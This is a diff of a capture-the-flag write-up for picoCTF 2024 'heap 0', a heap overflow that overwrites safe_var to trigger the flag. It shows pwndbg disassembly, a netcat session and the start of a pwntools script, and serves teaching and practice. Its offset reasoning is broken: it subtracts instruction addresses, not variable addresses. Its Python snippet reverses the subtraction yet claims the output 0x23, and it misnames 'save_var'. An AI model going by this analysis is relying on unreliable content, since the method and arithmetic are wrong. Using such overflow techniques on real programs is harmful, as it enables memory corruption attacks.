@@ -1,25 +1,39 @@
-# heap 0
+# heap 0 - PicoCTF 2024
 
-Level: Easy
+**Category:** Binary Exploitation  
+**Difficulty:** Easy  
+**Tags:** Heap, Offset Calculation, pwntools, pwndbg
 
-## Initial Thoughts
-This challenge is called heap, so right away I am thinking we are going to be working with the heap somehow.
+---
 
-This thought was solidified further after reading the description:
-```text
-Are overflows just a stack concern
-```
+## Challenge Description
 
-So we are likely not working with the stack, but rather the heap
+> Are overflows just a stack concern?
+>
+> Files provided:
+> - `chall` (binary)
+> - `chall.c` (source code)
+> - Remote instance: `nc tethys.picoctf.net <port>`
 
-As always, I launched the instance and saw three new things:
-1. The program source file: `chall.c`
-2. The program binary file: `chall`
-3. A server to connect to via netcat: `nc tethys.picoctf.net <port>`
+> <details>
+> <summary>Hints</summary>
+>   What part of the heap do you have control over and how far is it from the safe_var?
+> </details>
 
-Right away, I checked out the source file and the binary.
+---
 
-First, the source file:
+## Initial Analysis
+
+Upon reading the description and reviewing the source code, it's clear that:
+
+- We are going to have to manipulate the heap somehow
+
+> The heap is simply a region of memory used for dynamic memory allocation.
+
+---
+
+## Source Code Analysis
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -150,65 +164,55 @@ int main(void) {
 }
 ```
 
-What's going on here? I notice a few things immediately:
-1. When the `check_win()` function is called, it is checkin gto see if the `safe_var` doesn't equal to "bico". This means that we are going to want to write overwrite "bico" in `safe_var` somehow...
-2. We see. we are able to write to `input_data`, but I bet we can overflow it by finding the offset between `input_data` and `safe_var`, then writing more than that.
+### Key Observations
 
-Let's try it!
+- We can overwrite `input_data` past the heap to overwrite `safe_var`
+- Once we overwrite `safe_var`, we can call `check_win()` and get the flag
 
-## Solving the Challenge
-First, let's find the offset
+---
 
-Let's fire up `gdb` with the program binary (I'll be using `pwngdb` which is just a flavor of `gdb`, but is highly recommended).
+## Static Binary Analysis
+
+We analyze the binary with pwndbg to find the static offset between the `input_data` and `safe_var` variables in the `print_heap()` function.
+
 ```sh
 $ pwndbg ./chall
-Reading symbols from ./chall...
-pwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] for a list.
-pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
-------- tip of the day (disable with set show-tips off) -------
-Pwndbg context displays where the program branches to thanks to emulating few instructions into the future. You can disable this with set emulate off which may also speed up debugging
+[snip...]
 pwndbg> disassemble print_heap 
+[snip...] 
 Dump of assembler code for function print_heap:
-   0x0000000000001330 <+0>:     push   r14
-   0x0000000000001332 <+2>:     push   rbx
-   0x0000000000001333 <+3>:     push   rax
-   0x0000000000001334 <+4>:     lea    rdi,[rip+0xfae]        # 0x22e9
-   0x000000000000133b <+11>:    call   0x1030 <puts@plt>
-   0x0000000000001340 <+16>:    lea    rbx,[rip+0xfce]        # 0x2315
-   0x0000000000001347 <+23>:    mov    rdi,rbx
-   0x000000000000134a <+26>:    call   0x1030 <puts@plt>
-   0x000000000000134f <+31>:    lea    rdi,[rip+0xf9f]        # 0x22f5
-   0x0000000000001356 <+38>:    call   0x1030 <puts@plt>
-   0x000000000000135b <+43>:    mov    rdi,rbx
-   0x000000000000135e <+46>:    call   0x1030 <puts@plt>
+[snip...]
    0x0000000000001363 <+51>:    mov    rdx,QWORD PTR [rip+0x2d16]        # 0x4080 <input_data>
-   0x000000000000136a <+58>:    lea    r14,[rip+0xe0e]        # 0x217f
-   0x0000000000001371 <+65>:    mov    rdi,r14
-   0x0000000000001374 <+68>:    mov    rsi,rdx
-   0x0000000000001377 <+71>:    xor    eax,eax
-   0x0000000000001379 <+73>:    call   0x1040 <printf@plt>
-   0x000000000000137e <+78>:    mov    rdi,rbx
-   0x0000000000001381 <+81>:    call   0x1030 <puts@plt>
+[snip...]
    0x0000000000001386 <+86>:    mov    rdx,QWORD PTR [rip+0x2ceb]        # 0x4078 <safe_var>
-   0x000000000000138d <+93>:    mov    rdi,r14
-   0x0000000000001390 <+96>:    mov    rsi,rdx
-   0x0000000000001393 <+99>:    xor    eax,eax
-   0x0000000000001395 <+101>:   call   0x1040 <printf@plt>
-   0x000000000000139a <+106>:   mov    rdi,rbx
-   0x000000000000139d <+109>:   call   0x1030 <puts@plt>
-   0x00000000000013a2 <+114>:   mov    rax,QWORD PTR [rip+0x2c37]        # 0x3fe0
-   0x00000000000013a9 <+121>:   mov    rdi,QWORD PTR [rax]
-   0x00000000000013ac <+124>:   call   0x1080 <fflush@plt>
-   0x00000000000013b1 <+129>:   add    rsp,0x8
-   0x00000000000013b5 <+133>:   pop    rbx
-   0x00000000000013b6 <+134>:   pop    r14
-   0x00000000000013b8 <+136>:   ret
-End of assembler dump.
+[snip...]
 ```
 
-Voiala. From that, we see we have the address `0x0000000000001363` for `input_data` and `0x0000000000001386` for `safe_var`. We can subtract these and we get 0x23, or 35 in decimal. Perfect. Now we can enter in 35 or more bytes and we will get our flag!
+### Offset Calculation
 
-Let's run the service and see if this works:
+```
+$ python3
+>>> input_data_addr = 0x1363
+>>> safe_var_addr = 0x1386
+>>> offset = input_data_addr - safe_var_addr
+>>> print(offset)
+0x23 # aka: 35 bytes
+```
+
+**The key realization is that if we pass 35 bytes or more to `input_data`, `save_var` will be overwritten and no longer contain the string "bico" exactly, which is what is checked when `check_win()` is called.**
+
+---
+
+## Exploitation
+
+### Plan
+
+1. Write 35+ bytes to the buffer via the menu option
+2. Check the heap to make sure `safe_var` was overwritten via the menu option
+3. Print the flag via the menu option (by calling `check_win()`)
+
+### Manual Exploitation
+
 ```
 $ nc tethys.picoctf.net 62816
 
@@ -262,7 +266,7 @@ YOU WIN
 picoCTF{<censored>}
 ```
 
-That's great, but now let's automate it! We can use `pwntools` for this:
+### Automated Exploitation with pwntools
 
 ```python
 from pwn import *
